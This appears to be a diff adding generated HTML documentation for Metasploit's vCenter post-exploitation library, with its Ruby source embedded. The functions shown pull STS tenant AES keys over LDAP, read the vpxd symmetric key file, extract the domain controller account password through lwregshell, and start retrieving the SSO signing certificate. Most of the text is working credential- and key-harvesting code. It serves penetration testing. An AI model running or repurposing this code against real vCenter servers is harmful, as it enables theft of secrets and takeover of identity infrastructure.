+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the base dn to use</p>
+</div>
+      
+    </li>
+  
+    <li>
+      
+        <span class='name'>shell_bind_pw</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the password for the bind dn</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>Array</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>of the keys, nil on error</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+524
+525
+526
+527
+528
+529
+530
+531
+532
+533
+534
+535
+536
+537
+538
+539
+540
+541
+542
+543
+544
+545
+546
+547
+548
+549
+550
+551
+552
+553
+554
+555
+556
+557
+558
+559
+560
+561
+562
+563
+564
+565
+566
+567</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 524</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_aes_keys'>get_aes_keys</span><span class='lparen'>(</span><span class='id identifier rubyid_base_fqdn'>base_fqdn</span><span class='comma'>,</span> <span class='id identifier rubyid_vc_psc_fqdn'>vc_psc_fqdn</span><span class='comma'>,</span> <span class='id identifier rubyid_base_dn'>base_dn</span><span class='comma'>,</span> <span class='id identifier rubyid_bind_dn'>bind_dn</span><span class='comma'>,</span> <span class='id identifier rubyid_shell_bind_pw'>shell_bind_pw</span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_command_exists?'>command_exists?</span> <span class='id identifier rubyid_ldapsearch_bin'>ldapsearch_bin</span>
+
+  <span class='comment'># this may error,
+</span>  <span class='id identifier rubyid_header'>header</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>vmwSTSTenantKey: </span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_header2'>header2</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>vmwSTSTenantKey:: </span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_legacy_key_file'>legacy_key_file</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/etc/vmware-vpx/ssl/symkey.dat</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_all_keys'>all_keys</span> <span class='op'>=</span> <span class='lbracket'>[</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_key_contents'>key_contents</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_output'>output</span> <span class='op'>=</span> <span class='id identifier rubyid_cmd_exec'>cmd_exec</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_ldapsearch_bin'>ldapsearch_bin</span><span class='embexpr_end'>}</span><span class='tstring_content'> -h </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_vc_psc_fqdn'>vc_psc_fqdn</span><span class='embexpr_end'>}</span><span class='tstring_content'> -LLL -p 389 -b \&quot;cn=</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_base_fqdn'>base_fqdn</span><span class='embexpr_end'>}</span><span class='tstring_content'>,cn=Tenants,cn=IdentityManager,cn=Services,</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_base_dn'>base_dn</span><span class='embexpr_end'>}</span><span class='tstring_content'>\&quot; -D \&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_bind_dn'>bind_dn</span><span class='embexpr_end'>}</span><span class='tstring_content'>\&quot; -w </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_shell_bind_pw'>shell_bind_pw</span><span class='embexpr_end'>}</span><span class='tstring_content'> \&quot;(objectClass=vmwSTSTenant)\&quot; vmwSTSTenantKey</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_output'>output</span> <span class='op'>=</span> <span class='id identifier rubyid_output'>output</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_key_output'>key_output</span> <span class='op'>=</span> <span class='kw'>false</span>
+  <span class='id identifier rubyid_output'>output</span><span class='period'>.</span><span class='id identifier rubyid_each'>each</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_line'>line</span><span class='op'>|</span>
+    <span class='comment'># skip anything until we get to content
+</span>    <span class='kw'>next</span> <span class='kw'>unless</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_starts_with?'>starts_with?</span><span class='lparen'>(</span><span class='id identifier rubyid_header'>header</span><span class='rparen'>)</span> <span class='op'>||</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_starts_with?'>starts_with?</span><span class='lparen'>(</span><span class='id identifier rubyid_header2'>header2</span><span class='rparen'>)</span> <span class='op'>||</span> <span class='id identifier rubyid_key_output'>key_output</span>
+
+    <span class='comment'># aka our first key, there should only be one, but just in case
+</span>    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_starts_with?'>starts_with?</span><span class='lparen'>(</span><span class='id identifier rubyid_header'>header</span><span class='rparen'>)</span> <span class='op'>||</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_starts_with?'>starts_with?</span><span class='lparen'>(</span><span class='id identifier rubyid_header2'>header2</span><span class='rparen'>)</span><span class='rparen'>)</span> <span class='op'>&amp;&amp;</span> <span class='op'>!</span><span class='id identifier rubyid_key_output'>key_output</span> <span class='comment'># first key
+</span>      <span class='id identifier rubyid_key_output'>key_output</span> <span class='op'>=</span> <span class='kw'>true</span>
+    <span class='kw'>elsif</span> <span class='lparen'>(</span><span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_starts_with?'>starts_with?</span><span class='lparen'>(</span><span class='id identifier rubyid_header'>header</span><span class='rparen'>)</span> <span class='op'>||</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_starts_with?'>starts_with?</span><span class='lparen'>(</span><span class='id identifier rubyid_header2'>header2</span><span class='rparen'>)</span><span class='rparen'>)</span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_key_output'>key_output</span> <span class='comment'># our n+1 key
+</span>      <span class='id identifier rubyid_key'>key</span> <span class='op'>=</span> <span class='id identifier rubyid_key_contents'>key_contents</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span>
+      <span class='id identifier rubyid_all_keys'>all_keys</span><span class='period'>.</span><span class='id identifier rubyid_append'>append</span><span class='lparen'>(</span><span class='id identifier rubyid_key'>key</span><span class='rparen'>)</span> <span class='kw'>unless</span> <span class='id identifier rubyid_key'>key</span><span class='period'>.</span><span class='id identifier rubyid_empty?'>empty?</span>
+      <span class='id identifier rubyid_key_contents'>key_contents</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+    <span class='kw'>end</span>
+    <span class='id identifier rubyid_line'>line</span> <span class='op'>=</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='id identifier rubyid_header2'>header2</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_line'>line</span> <span class='op'>=</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='id identifier rubyid_header'>header</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_key_contents'>key_contents</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span><span class='embexpr_end'>}</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_key_output'>key_output</span>
+  <span class='kw'>end</span>
+  <span class='id identifier rubyid_key'>key</span> <span class='op'>=</span> <span class='id identifier rubyid_key_contents'>key_contents</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span>
+  <span class='id identifier rubyid_all_keys'>all_keys</span><span class='period'>.</span><span class='id identifier rubyid_append'>append</span><span class='lparen'>(</span><span class='id identifier rubyid_key'>key</span><span class='rparen'>)</span> <span class='kw'>unless</span> <span class='id identifier rubyid_key'>key</span><span class='period'>.</span><span class='id identifier rubyid_empty?'>empty?</span>
+
+  <span class='comment'># go try for the vmware-vpx AES key
+</span>  <span class='id identifier rubyid_exists'>exists</span> <span class='op'>=</span> <span class='id identifier rubyid_file_exist?'>file_exist?</span><span class='lparen'>(</span><span class='id identifier rubyid_legacy_key_file'>legacy_key_file</span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='id identifier rubyid_all_keys'>all_keys</span> <span class='kw'>if</span> <span class='op'>!</span><span class='id identifier rubyid_exists'>exists</span> <span class='op'>&amp;&amp;</span> <span class='op'>!</span><span class='id identifier rubyid_all_keys'>all_keys</span><span class='period'>.</span><span class='id identifier rubyid_empty?'>empty?</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>if</span> <span class='op'>!</span><span class='id identifier rubyid_exists'>exists</span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_all_keys'>all_keys</span><span class='period'>.</span><span class='id identifier rubyid_empty?'>empty?</span>
+
+  <span class='id identifier rubyid_cert_contents'>cert_contents</span> <span class='op'>=</span> <span class='id identifier rubyid_read_file'>read_file</span><span class='lparen'>(</span><span class='id identifier rubyid_legacy_key_file'>legacy_key_file</span><span class='rparen'>)</span>
+  <span class='kw'>unless</span> <span class='id identifier rubyid_cert_contents'>cert_contents</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span> <span class='op'>||</span> <span class='id identifier rubyid_cert_contents'>cert_contents</span><span class='period'>.</span><span class='id identifier rubyid_empty?'>empty?</span>
+    <span class='id identifier rubyid_all_keys'>all_keys</span><span class='period'>.</span><span class='id identifier rubyid_append'>append</span><span class='lparen'>(</span><span class='id identifier rubyid_cert_contents'>cert_contents</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span><span class='rparen'>)</span>
+    <span class='kw'>return</span> <span class='id identifier rubyid_all_keys'>all_keys</span> <span class='kw'>unless</span> <span class='id identifier rubyid_all_keys'>all_keys</span><span class='period'>.</span><span class='id identifier rubyid_empty?'>empty?</span>
+  <span class='kw'>end</span>
+
+  <span class='kw'>nil</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_database_type-instance_method">
+  
+    #<strong>get_database_type</strong>  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>It returns the vcenter database type. Should be ‘embedded’, or ‘management’ <a href="https://kb.vmware.com/s/article/83193">kb.vmware.com/s/article/83193</a></p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>of vcenter database type</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+155
+156
+157
+158
+159</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 155</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_database_type'>get_database_type</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_file_exist?'>file_exist?</span><span class='lparen'>(</span><span class='id identifier rubyid_database_type_file'>database_type_file</span><span class='rparen'>)</span>
+
+  <span class='kw'>return</span> <span class='id identifier rubyid_read_file'>read_file</span><span class='lparen'>(</span><span class='id identifier rubyid_database_type_file'>database_type_file</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_downcase'>downcase</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_deployment_type-instance_method">
+  
+    #<strong>get_deployment_type</strong>  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>It returns the vcenter deployment type. Should be ‘embedded’, ‘infrastructure’, or ‘management’</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>of vcenter deployment type</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+144
+145
+146
+147
+148</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 144</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_deployment_type'>get_deployment_type</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_file_exist?'>file_exist?</span><span class='lparen'>(</span><span class='id identifier rubyid_deployment_type_file'>deployment_type_file</span><span class='rparen'>)</span>
+
+  <span class='kw'>return</span> <span class='id identifier rubyid_read_file'>read_file</span><span class='lparen'>(</span><span class='id identifier rubyid_deployment_type_file'>deployment_type_file</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_downcase'>downcase</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_domain_dc_dn-instance_method">
+  
+    #<strong>get_domain_dc_dn</strong>  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns the domain controller account DN</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>of the domain controller account DN</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+230
+231
+232
+233
+234</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 230</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_domain_dc_dn'>get_domain_dc_dn</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_command_exists?'>command_exists?</span><span class='lparen'>(</span><span class='id identifier rubyid_lwregshell_bin'>lwregshell_bin</span><span class='rparen'>)</span>
+
+  <span class='kw'>return</span> <span class='id identifier rubyid_cmd_exec'>cmd_exec</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_lwregshell_bin'>lwregshell_bin</span><span class='embexpr_end'>}</span><span class='tstring_content'> list_values &#39;[HKEY_THIS_MACHINE\\Services\\vmdir]&#39;|grep dcAccountDN|awk &#39;{$1=$2=$3=\&quot;\&quot;;print $0}&#39;|tr -d &#39;\&quot;&#39;|sed -e &#39;s/^[ \t]*//&#39;</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_domain_dc_password-instance_method">
+  
+    #<strong>get_domain_dc_password</strong>  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns the domain controller account password</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>of the domain controller account password, matches with get_domain_dc_dn. nil if not found.</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+240
+241
+242
+243
+244
+245
+246
+247</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 240</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_domain_dc_password'>get_domain_dc_password</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_command_exists?'>command_exists?</span><span class='lparen'>(</span><span class='id identifier rubyid_lwregshell_bin'>lwregshell_bin</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_password'>password</span> <span class='op'>=</span> <span class='id identifier rubyid_cmd_exec'>cmd_exec</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>echo $(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_lwregshell_bin'>lwregshell_bin</span><span class='embexpr_end'>}</span><span class='tstring_content'> list_values &#39;[HKEY_THIS_MACHINE\\Services\\vmdir]&#39;|grep dcAccountPassword |awk -F &#39;REG_SZ&#39; &#39;{print $2}&#39;)</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_password'>password</span>
+
+  <span class='kw'>return</span> <span class='id identifier rubyid_password'>password</span><span class='lbracket'>[</span><span class='int'>1</span><span class='op'>..</span><span class='id identifier rubyid_password'>password</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>-</span> <span class='int'>2</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>\&quot;</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>&quot;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_domain_name-instance_method">
+  
+    #<strong>get_domain_name</strong>  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns the domain name of the server</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>of the domain name</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+220
+221
+222
+223
+224</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 220</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_domain_name'>get_domain_name</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_command_exists?'>command_exists?</span><span class='lparen'>(</span><span class='id identifier rubyid_lwregshell_bin'>lwregshell_bin</span><span class='rparen'>)</span>
+
+  <span class='kw'>return</span> <span class='id identifier rubyid_cmd_exec'>cmd_exec</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_lwregshell_bin'>lwregshell_bin</span><span class='embexpr_end'>}</span><span class='tstring_content'> list_values &#39;[HKEY_THIS_MACHINE\\Services\\vmafd\\Parameters]&#39;|grep DomainName|awk &#39;{print $4}&#39;|tr -d &#39;\&quot;&#39;</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_fqdn-instance_method">
+  
+    #<strong>get_fqdn</strong>  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>It returns the host FQDN.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>of the host FQDN</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+165
+166
+167
+168
+169
+170
+171
+172
+173</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 165</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_fqdn'>get_fqdn</span>
+  <span class='id identifier rubyid_fqdn'>fqdn</span> <span class='op'>=</span> <span class='kw'>nil</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_command_exists?'>command_exists?</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/opt/vmware/share/vami/vami_hname</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_command_exists?'>command_exists?</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/opt/vmware/share/vami/vami_domain</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_fqdn'>fqdn</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_cmd_exec'>cmd_exec</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/opt/vmware/share/vami/vami_hname</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span><span class='embexpr_end'>}</span><span class='tstring_content'>.</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_cmd_exec'>cmd_exec</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/opt/vmware/share/vami/vami_domain</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='period'>.</span><span class='id identifier rubyid_downcase'>downcase</span>
+  <span class='kw'>elsif</span> <span class='id identifier rubyid_file_exist?'>file_exist?</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/etc/hostname</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_fqdn'>fqdn</span> <span class='op'>=</span> <span class='id identifier rubyid_read_file'>read_file</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/etc/hostname</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_downcase'>downcase</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span>
+  <span class='kw'>end</span>
+  <span class='kw'>return</span> <span class='id identifier rubyid_fqdn'>fqdn</span> <span class='kw'>if</span> <span class='id identifier rubyid_is_fqdn?'>is_fqdn?</span><span class='lparen'>(</span><span class='id identifier rubyid_fqdn'>fqdn</span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_idp_certs-instance_method">
+  
+    #<strong>get_idp_certs</strong>(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)  &#x21d2; <tt>Array</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Retrieves the IDP certificate</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>base_fqdn</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>fully qualified domain name of the virtual center</p>
+</div>
+      
+    </li>
+  
+    <li>
+      
+        <span class='name'>vc_psc_fqdn</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>fully qualified domain name of the virtual center</p>
+</div>
+      
+    </li>
+  
+    <li>
+      
+        <span class='name'>base_dn</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the base dn to search in ldap</p>
+</div>
+      
+    </li>
+  
+    <li>
+      
+        <span class='name'>bind_dn</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the base dn to use</p>
+</div>
+      
+    </li>
+  
+    <li>
+      
+        <span class='name'>shell_bind_pw</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the password for the bind dn</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>Array</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>of the Certificates, nil on error</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+474
+475
+476
+477
+478
+479
+480
+481
+482
+483
+484
+485
+486
+487
+488
+489
+490
+491
+492
+493
+494
+495
+496
+497
+498
+499
+500
+501
+502
+503
+504
+505
+506
+507
+508
+509
+510
+511
+512</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 474</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_idp_certs'>get_idp_certs</span><span class='lparen'>(</span><span class='id identifier rubyid_base_fqdn'>base_fqdn</span><span class='comma'>,</span> <span class='id identifier rubyid_vc_psc_fqdn'>vc_psc_fqdn</span><span class='comma'>,</span> <span class='id identifier rubyid_base_dn'>base_dn</span><span class='comma'>,</span> <span class='id identifier rubyid_bind_dn'>bind_dn</span><span class='comma'>,</span> <span class='id identifier rubyid_shell_bind_pw'>shell_bind_pw</span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_command_exists?'>command_exists?</span> <span class='id identifier rubyid_ldapsearch_bin'>ldapsearch_bin</span>
+
+  <span class='id identifier rubyid_header'>header</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>userCertificate:: </span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_legacy_cert_file'>legacy_cert_file</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/etc/vmware-sso/keys/ssoserverSign.crt</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_all_certs'>all_certs</span> <span class='op'>=</span> <span class='lbracket'>[</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_cert_contents'>cert_contents</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
